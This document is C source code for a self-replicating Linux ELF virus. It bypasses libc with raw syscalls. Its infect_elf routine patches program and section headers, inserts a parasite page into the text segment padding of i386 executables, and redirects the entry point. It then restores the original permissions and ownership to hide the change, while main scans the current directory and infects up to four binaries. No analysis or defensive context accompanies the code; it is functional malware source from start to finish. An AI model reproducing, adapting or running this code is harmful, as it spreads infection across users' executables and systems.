   #include <linux/types.h>
   #include <linux/unistd.h>
   #include <linux/dirent.h>
   #include <linux/time.h>
   #include <linux/fcntl.h>
   #include <elf.h>

   /* stdio.h has these normally, but where trying avoding libc */

   #ifdef DEBUG
   int printf(const char *fmt, ...);
   #endif

   #define SEEK_SET    0
   #define SEEK_CUR    1
   #define SEEK_END    2

   #define PAGE_SIZE   4096

   #define PRN_MOD     729
   #define PRN_MUL     40
   #define PRN_INC     3641

   #define PRN_DO(M)   ((PRN_MUL*(M) + PRN_INC) % PRN_MOD);

   #define YINFECT     4
   #define NINFECT     16

   #define TMPFILENAME ".vi434.tmp"

   /*
       normally in sys/stat.h (actually statbuf.h) but again, where avoiding
       libc.  the man page shows a different format btw. we use the linux
       one.
   */

   struct stat {
       dev_t st_dev;                     /* Device.  */
       unsigned short int __pad1;
       ino_t st_ino;                     /* File serial number.  */
       mode_t st_mode;                   /* File mode.  */
       nlink_t st_nlink;                 /* Link count.  */
       uid_t st_uid;                     /* User ID of the file's owner. */
       gid_t st_gid;                     /* Group ID of the file's group.*/
       dev_t st_rdev;                    /* Device number, if device.  */
       unsigned short int __pad2;
       off_t st_size;                    /* Size of file, in bytes.  */
       unsigned long int st_blksize;       /* Optimal block size for I/O.  */
       unsigned long int st_blocks;        /* Number of 512-byte blocks allocated.
    */
       time_t st_atime;                  /* Time of last access.  */
       unsigned long int __unused1;
       time_t st_mtime;                  /* Time of last modification.  */
       unsigned long int __unused2;
       time_t st_ctime;                  /* Time of last status change.  */
       unsigned long int __unused3;
       unsigned long int __unused4;
       unsigned long int __unused5;
   };

   /*
       Remember, we cant use libc even for things like open, close etc

       New __syscall macros are made so not to use errno which are just
       modified _syscall routines from asm/unistd.h
   */

   #define __syscall1(type,name,type1,arg1) \
   type name(type1 arg1) \
   { \
   long __res; \
   __asm__ volatile ("int $0x80" \
       : "=a" (__res) \
       : "0" (__NR_##name),"b" ((long)(arg1))); \
       return (type) __res; \
   }

   #define __syscall2(type,name,type1,arg1,type2,arg2) \
   type name(type1 arg1,type2 arg2) \
   { \
   long __res; \
   __asm__ volatile ("int $0x80" \
       : "=a" (__res) \
       : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
       return (type) __res; \
   }

   #define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
   type name(type1 arg1,type2 arg2,type3 arg3) \
   { \
   long __res; \
   __asm__ volatile ("int $0x80" \
       : "=a" (__res) \
       : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
           "d" ((long)(arg3))); \
       return (type) __res; \
   }

   __syscall1(time_t, time, time_t *, t);
   __syscall1(unsigned long, brk, unsigned long, brk);
   __syscall2(int, fstat, int, fd, struct stat *, buf);
   __syscall1(int, unlink, const char *, pathname);
   __syscall2(int, fchmod, int, filedes, mode_t, mode);
   __syscall3(int, fchown, int, fd, uid_t, owner, gid_t, group);
   __syscall2(int, rename, const char *, oldpath, const char *, newpath);
   __syscall3(int, getdents, uint, fd, struct dirent *, dirp, uint, count);
   __syscall3(int, open, const char *, file, int, flag, int, mode);
   __syscall1(int, close, int, fd);
   __syscall3(off_t, lseek, int, filedes, off_t, offset, int, whence);
   __syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
   __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);

   int copy_partial(int fd, int od, unsigned int len)
   {
       char idata[PAGE_SIZE];
       unsigned int n = 0;
       int r;
       int x = PAGE_SIZE;

       while (x < len) {
           if (read(fd, idata, PAGE_SIZE) != PAGE_SIZE) goto error;
           if (write(od, idata, PAGE_SIZE) != PAGE_SIZE) goto error;

           n += PAGE_SIZE;
           x += PAGE_SIZE;
       }

       r = read(fd, idata, len - n);
       if (r < 0) goto error;
       if (write(od, idata, r) != r) goto error;

       return 0;
   error:
       return 1;
   }

   int infect_elf(
       char *filename, int fd,
       char *v, int vlen, long vhentry, long ventry, long vhoff
   )
   {
       Elf32_Shdr *shdr;
       Elf32_Phdr *phdr;
       Elf32_Ehdr ehdr;
       int i;
       int offset, oshoff, pos;
       int evaddr;
       int plen, slen;
       unsigned long b = brk(0), k, sdata, pdata;
       int retval;
       struct stat stat;
       int od = -1;
   #ifndef DEBUG
       volatile unsigned long addr = -2;   /* use the stack */
   #endif

   /* read the ehdr */

       if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) goto error;

   /* ELF checks */

       if (
           ehdr.e_ident[0] != ELFMAG0 ||
           ehdr.e_ident[1] != ELFMAG1 ||
           ehdr.e_ident[2] != ELFMAG2 ||
           ehdr.e_ident[3] != ELFMAG3
       ) goto error;

       if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) goto error;
       if (ehdr.e_machine != EM_386 && ehdr.e_machine != EM_486) goto error;
       if (ehdr.e_version != EV_CURRENT) goto error;

   /* modify the parasite so that it knows the correct re-entry point */

       *(int *)&v[vhentry] = ehdr.e_entry;

   /* allocate memory for tables */

       plen = sizeof(*phdr)*ehdr.e_phnum;
       sdata = k = b + plen;
       slen = sizeof(*shdr)*ehdr.e_shnum;
       k += slen;

       if (brk(k) != k) goto error;

       pdata = b;

   /* read the phdr's */

       if (lseek(fd, ehdr.e_phoff, SEEK_SET) < 0) goto error;
       if (read(fd, (void *)pdata, plen) != plen) goto error;

   /*
       update the phdr's to reflect the extention of the text segment (to
       allow virus insertion)
   */

       offset = 0;

       for (phdr = (Elf32_Phdr *)pdata, i = 0; i < ehdr.e_phnum; i++) {
           if (offset) {
               phdr->p_offset += PAGE_SIZE;
           } else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
   /*
       is this the text segment ? Nothing says the offset must be 0 but it
       normally is.
   */
               int palen;

               if (phdr->p_filesz != phdr->p_memsz) goto error;

               evaddr = phdr->p_vaddr + phdr->p_filesz;
               palen = PAGE_SIZE - (evaddr & (PAGE_SIZE - 1));

               if (palen < vlen) goto error;

               ehdr.e_entry = evaddr + ventry;
               offset = phdr->p_offset + phdr->p_filesz;

               phdr->p_filesz += vlen;
               phdr->p_memsz += vlen;
           }

           ++phdr;
       }

       if (offset == 0) goto error;

   /* patch the offset */
       *(long *)&v[vhoff] = offset;

   /* read the shdr's */

       if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) goto error;
       if (read(fd, (void *)sdata, slen) != slen) goto error;

   /* update the shdr's to reflect the insertion of the parasite */

       for (shdr = (Elf32_Shdr *)sdata, i = 0; i < ehdr.e_shnum; i++) {
           if (shdr->sh_offset >= offset) {
               shdr->sh_offset += PAGE_SIZE;
   /* is this the last text section? */
           } else if (shdr->sh_addr + shdr->sh_size == evaddr) {
   /* if its not strip safe then we cant use it */
               if (shdr->sh_type != SHT_PROGBITS) goto error;

               shdr->sh_size += vlen;
           }

           ++shdr;
       }

   /* update ehdr to reflect new offsets */

       oshoff = ehdr.e_shoff;
       if (ehdr.e_shoff >= offset) ehdr.e_shoff += PAGE_SIZE;

   /* make the parasite */

       if (fstat(fd, &stat) < 0) goto error;

   #ifdef DEBUG
       if ((od = open(
           TMPFILENAME, O_WRONLY | O_CREAT | O_TRUNC, stat.st_mode
       )) < 0) goto error;
   #else
       if ((od = open(
           (char *)addr, O_WRONLY | O_CREAT | O_TRUNC, stat.st_mode
       )) < 0) goto error;
   #endif

   /* Reconstruct a copy of the ELF file with the parasite */

       if (lseek(fd, 0, SEEK_SET) < 0) goto error;
       if (write(od, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) goto error;
       if (write(od, (char *)pdata, plen) != plen) goto error;
       if (lseek(fd, pos = sizeof(ehdr) + plen, SEEK_SET) < 0) goto error;
       if (copy_partial(fd, od, offset - pos)) goto error;
       if (write(od, v, PAGE_SIZE) != PAGE_SIZE) goto error;
       if (copy_partial(fd, od, oshoff - offset)) goto error;
       if (write(od, (char *)sdata, slen) != slen) goto error;
       if (lseek(fd, pos = oshoff + slen, SEEK_SET) < 0) goto error;
       if (copy_partial(fd, od, stat.st_size - pos)) goto error;

   /* Make the parasitic ELF the real one */

   #ifdef DEBUG
       if (rename(TMPFILENAME, filename) < 0) goto error;
   #else
       if (rename((char *)addr, filename) < 0) goto error;
   #endif

   /* Make it look like the original */

       if (fchmod(od, stat.st_mode) < 0) goto error;
       if (fchown(od, stat.st_uid, stat.st_gid) < 0) goto error;

   /* All done */

   #ifdef DEBUG
       printf(
           "\n"
           "Infection of (%s) complete\n"
           "parasite offset: %i\n"
           "\n",
           filename, offset
       );
   #endif
       retval = 1;
       goto leave;

   error:
       retval = 0;

   leave:
       brk(b);
       if (od >= 0) close(od);
   #ifdef DEBUG
       unlink(TMPFILENAME);
   #else
       unlink((char *)addr);
   #endif
       return retval;
   }

   int main(int argc, char *argv[])
   {
       char data[8192];
       char v[PAGE_SIZE];
       int fd, dd;
       int n;
       int ninfect = 0, yinfect = 0;
       int rnval;
   /* these must be patched after manual infection */
       volatile int vlen = 2000;   /* parasite length */
   /* offset to where the parasite lseek's to itself to copy itself */
       volatile long vhoff = 4000;
   /* offset to where the parasite's host entry point is */
       volatile long vhentry = 1000;
   /* offset to where the parasite's entry point is */
       volatile long ventry = 3000;

   #ifdef DEBUG
       if (argc != 2) {
           printf("usage: elf-p-virus argv0\n");
           exit(1);
       }

       printf("Parent is (%s)\n\n", argv[1]);
       if ((fd = open(argv[1], O_RDONLY, 0)) < 0) goto error;
   #else
       if ((fd = open(argv[0], O_RDONLY, 0)) < 0) goto error;
   #endif

   /* this must be patched */
       if (lseek(fd, 4000, SEEK_SET) < 0) goto error;
       if (read(fd, v, vlen) != vlen) goto error;

       close(fd);
       fd = -1;

       if ((dd = open(".", O_RDONLY, 0)) < 0) goto error;

       rnval = PRN_DO(time(NULL));

       while ((n = getdents(dd, (struct dirent *)data, sizeof(data))) > 0) {
           struct dirent *dirp = dirp = (struct dirent *)data;
           int r = 0;

           while (1) {
               struct dirent dirent;
               int i = 0;

               if (yinfect >= YINFECT || ninfect >= NINFECT)
                   break;

   #ifdef DEBUG
               printf("Got %s...\n", dirp->d_name);
   #endif
               fd = open(dirp->d_name, O_RDWR, 0);
               if (fd >= 0) {
                   if (getdents(
                       fd, &dirent, sizeof(dirent)
                   ) < 0) {
                       if (infect_elf(
                           dirp->d_name, fd,
                           v, vlen, vhentry, ventry, vhoff
                       )) {
                           ++yinfect;
                       } else {
                           ++ninfect;
                       }
                   }
                   close(fd);
               }

               rnval = PRN_DO(rnval);

               while (i++ < rnval) {
                   if (r == n) r = 0;

                   dirp = (struct dirent *)&data[
                       r += dirp->d_reclen
                   ];
               }
           }
       }

       close(dd);
       fd = -1;

   error:
       if (fd >= 0) close(fd);
       return 0;
   }
